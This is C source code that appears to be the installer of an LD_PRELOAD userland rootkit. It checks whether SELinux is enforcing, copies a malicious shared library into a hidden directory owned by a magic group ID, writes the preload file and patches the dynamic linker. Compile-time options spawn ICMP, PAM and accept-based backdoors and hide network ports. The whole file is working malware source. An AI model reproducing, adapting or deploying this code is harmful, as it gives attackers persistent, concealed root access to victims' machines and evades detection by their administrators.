void bignope(char *installdir, int p){
#ifdef PATCH_DYNAMIC_LINKER
    if(p) // ...
        ldpatch(PRELOAD_FILE, OLD_PRELOAD);
    rm(PRELOAD_FILE);
#else
    rm(OLD_PRELOAD);
#endif
    eradicatedir(installdir);
    exit(0);
}

#define SECONFIG "/etc/selinux/config"
static char *const noselinux[2] = {"SELINUX=enforcing", "SELINUX=permissive"};

int anselinux(void){
    int acc;
    hook(CACCESS);
    acc = (long)call(CACCESS, SECONFIG, F_OK);
    if(acc != 0 && errno == ENOENT) return 0;
    else if(acc != 0){
        printf("access failed on: %s\n", SECONFIG);
        return -1;
    }
    return 1;
}

int chkselinux(void){
    FILE *fp;
    int badselinux=0;

    hook(CFOPEN);

    fp = call(CFOPEN, SECONFIG, "r");
    if(fp == NULL){
        printf("Failed trying to open %s for reading.\n", SECONFIG);
        return -1;
    }

    char line[LINE_MAX];
    memset(line, 0, sizeof(line));

    while(fgets(line, sizeof(line), fp) != NULL && !badselinux)
        for(int i=0; i<sizeofarr(noselinux) && !badselinux; i++)
            if(!strncmp(noselinux[i], line, strlen(noselinux[i])))
                badselinux=1;

    fclose(fp);

    return badselinux;
}

void bdvinstall(char *const argv[], char *installdir, char *bdvlso, char *preloadpath, gid_t magicgid){
    dorolf();

    int selinux = anselinux();
    if(selinux < 0){
        printf("Failed to determine if SELinux is present or not.\n");
        exit(0);
    }else if(selinux){
        printf("SELinux present. Going to determine status.\n");
        if(chkselinux()){
            printf("SELinux is enabled on this machine! This is not good!\n");
            printf("I HIGHLY advise against continuing installation...\n");
            printf("Otherwise press enter to continue...");
            getchar();
        }else printf("SELinux is disabled. Good.\n");
    }else printf("No SELinux.\n");

    int fedora=0;
    if(isfedora())
        fedora=1;

    printf("Creating installation directory.\n");
    if(preparedir(installdir, magicgid) < 0){
        printf("Something went wrong creating the install directory.\n");
        bignope(installdir, 0);
    }

    char *opath, *odup, *npath;
    int cpr, gotso=0;

    for(int i = 1; argv[i] != NULL; i++){
        if(strstr(argv[i], ".so.")){
            opath = argv[i];
            odup = strdup(opath);
            npath = sogetpath(odup, installdir, bdvlso);
            free(odup);

            if(npath == NULL){
                printf("Couldn't get new path for %s.\n", opath);
                bignope(installdir, 0);
            }

            cpr = socopy(opath, npath, magicgid);
            if(cpr) printf("Copied: \e[1;31m%s\e[0m\n", basename(opath));
            else{
                printf("Something went wrong copying \e[1;31m%s\e[0m...\n", opath);
                free(npath);
                bignope(installdir, 0);
            }

            if(fedora){
                char *sopath = rksopath(installdir, bdvlso);
                hook(CRENAME);
                if((long)call(CRENAME, npath, sopath) < 0){
                    printf("Rename failed: %s -> %s\n", npath, sopath);
                    free(npath);
                    free(sopath);
                    bignope(installdir, 0);
                }
                free(sopath);
            }

            free(npath);
            gotso++;

            if(fedora)
                break;
        }
    }

    if(!gotso) bignope(installdir, 0);
    if(_rknomore(installdir, bdvlso)){
        printf("It seems something may have went wrong installing...\n");
        bignope(installdir, 0);
    }

    reinstall(preloadpath, installdir, bdvlso);
    if(!preloadok(preloadpath, installdir, bdvlso)){
        printf("Something went wrong writing to %s\n", preloadpath);
        bignope(installdir, 1);
    }else printf("Installed.\n\n");

    if(getgid() != 0) // assume this was an update...
        return;

#ifdef PATCH_DYNAMIC_LINKER
    printf("Patching dynamic linker.\n");
    int p=ldpatch(OLD_PRELOAD, preloadpath);
    if(p < 0){
        printf("Something has went horribly wrong...\n");
        if(p == -2)
            printf("%s could not be located in ld.so.\n", OLD_PRELOAD);
        if(p == -3)
            printf("Failed allocating memory for ld.so paths.\n");
        // ...
        bignope(installdir, 0);
    }else if(p > 0) printf("Patched ld.so: \e[1;31m%d\e[0m\n", p);
    else{
        printf("Nothing to patch...?\n");
        bignope(installdir, 0);
    }
#endif

#ifdef USE_ICMP_BD
    spawnpdoor();
    sleep(1);
    if(pdoorup()) printf("ICMP backdoor up.\n");
    else printf("Failed spawning ICMP backdoor...\n");
#endif
#ifdef USE_PAM_BD
    printf("PAM username: \e[1;31m%s\e[0m\n", PAM_UNAME);
#endif
#ifdef HIDE_PORTS
    char portsbuf[512], tmp[8];
    size_t tmplen, buflen;
    memset(portsbuf, 0, sizeof(portsbuf));
    for(int i=0; i < BDVLPORTS_SIZE; i++){
#ifdef USE_ACCEPT_BD
        if(i == 0){
            printf("Accept backdoor port:\n  \e[1;31m%d\e[0m\n", bdvlports[i]);
            continue;
        }
#endif
        memset(tmp, 0, sizeof(tmp));
        snprintf(tmp, sizeof(tmp), "%d, ", bdvlports[i]);

        tmplen = strlen(tmp), buflen = strlen(portsbuf);
        if(buflen+tmplen >= sizeof(portsbuf)-1)
            break;

        strncat(portsbuf, tmp, tmplen);
    }
    portsbuf[strlen(portsbuf)-2]='\0';
    printf("Hidden port(s):\n  \e[1;31m%s\e[0m\n", portsbuf);
#endif
#ifdef BACKDOOR_UTIL
    printf("\nUnhappy with something?:\n  %s=1 sh -c './bdv uninstall'\n\n", BD_VAR);
#endif
}